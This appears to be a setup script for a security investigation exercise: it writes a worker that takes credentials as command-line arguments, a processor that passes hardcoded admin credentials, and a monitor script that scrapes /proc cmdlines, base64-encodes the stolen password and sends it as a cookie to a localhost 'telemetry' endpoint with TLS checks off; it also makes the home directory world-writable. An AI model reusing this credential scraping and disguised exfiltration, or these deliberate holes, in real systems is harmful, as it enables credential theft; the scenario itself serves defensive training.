#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip openssl
    pip3 install pytest

    mkdir -p /home/user/investigation

    cat << 'EOF' > /home/user/investigation/worker.py
import argparse
import time
import sys

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--user', required=True)
    parser.add_argument('--pass', required=True, dest='password')
    args = parser.parse_args()

    print(f"Worker started with user {args.user}")
    # Simulate work
    time.sleep(2)
    print("Worker finished.")

if __name__ == "__main__":
    main()
EOF

    cat << 'EOF' > /home/user/investigation/processor.py
import subprocess
import time
import sys

def main():
    print("Processor starting...")
    # VULNERABILITY: Credentials passed via CLI args
    p = subprocess.Popen([
        sys.executable, 
        "/home/user/investigation/worker.py", 
        "--user", "admin", 
        "--pass", "SuperSecret123!"
    ])
    p.wait()
    print("Processor done.")

if __name__ == "__main__":
    main()
EOF

    cat << 'EOF' > /home/user/investigation/monitor.py
import os
import time
import base64
import urllib.request
import ssl

def main():
    exfiltrated = False
    # Run for a maximum of 10 seconds
    for _ in range(10):
        if exfiltrated:
            break
        pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]
        for pid in pids:
            try:
                with open(os.path.join('/proc', pid, 'cmdline'), 'rb') as f:
                    cmdline = f.read().split(b'\x00')

                if b'worker.py' in cmdline and b'--user' in cmdline:
                    user_idx = cmdline.index(b'--user') + 1
                    pass_idx = cmdline.index(b'--pass') + 1

                    user = cmdline[user_idx].decode('utf-8')
                    password = cmdline[pass_idx].decode('utf-8')

                    payload = f"{user}:{password}".encode('utf-8')
                    encoded_payload = base64.b64encode(payload).decode('utf-8')

                    # Exfiltrate
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE

                    req = urllib.request.Request("https://localhost:8443/telemetry")
                    req.add_header("Cookie", f"session_id={encoded_payload}")

                    try:
                        urllib.request.urlopen(req, context=ctx, timeout=2)
                    except Exception:
                        pass # Ignore connection errors

                    exfiltrated = True
                    break
            except Exception:
                continue
        time.sleep(1)

if __name__ == "__main__":
    main()
EOF

    cat << 'EOF' > /home/user/investigation/run_env.sh
#!/bin/bash
cd /home/user/investigation

# Start monitor in background
python3 monitor.py &
MON_PID=$!

# Let monitor start up
sleep 1

# Run processor
python3 processor.py

# Wait for monitor to exit
wait $MON_PID
EOF

    chmod +x /home/user/investigation/run_env.sh

    useradd -m -s /bin/bash user || true
    chmod -R 777 /home/user
